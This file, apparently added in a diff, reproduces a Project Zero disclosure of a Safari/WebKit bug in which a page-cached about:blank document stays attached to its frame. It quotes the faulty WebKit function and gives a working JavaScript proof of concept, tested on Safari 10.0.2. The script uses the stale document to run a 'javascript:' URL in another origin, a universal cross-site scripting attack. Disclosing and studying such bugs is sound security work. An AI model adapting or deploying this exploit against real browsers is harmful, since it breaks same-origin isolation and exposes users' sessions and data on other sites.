@@ -1,0 +1,48 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1056
+
+void Frame::setDocument(RefPtr<Document>&& newDocument)
+{
+    ASSERT(!newDocument || newDocument->frame() == this);
+
+    if (m_doc && m_doc->pageCacheState() != Document::InPageCache)
+        m_doc->prepareForDestruction();
+
+    m_doc = newDocument.copyRef();
+    ...
+}
+
+The function |prepareForDestruction| only called when the cache state is not |Document::InPageCache|. So the frame will be never detached from the cached document.
+
+PoC:
+-->
+
+"use strict";
+
+document.write("click anywhere to start");
+
+window.onclick = () => {
+    let w = open("about:blank", "one");
+    let d = w.document;
+
+    let a = d.createElement("a");
+    a.href = "https://abc.xyz/";
+    a.click();  <<------- about:blank -> Document::InPageCache
+
+    let it = setInterval(() => {
+        try {
+            w.location.href.toString;
+        } catch (e) {
+            clearInterval(it);
+
+            let s = d.createElement("a");  <<------ about:blank's document
+            s.href = "javascript:alert(location)";
+            s.click();
+        }
+    }, 0);
+};
+
+
+<!--
+Tested on Safari 10.0.2(12602.3.12.0.1).
+-->
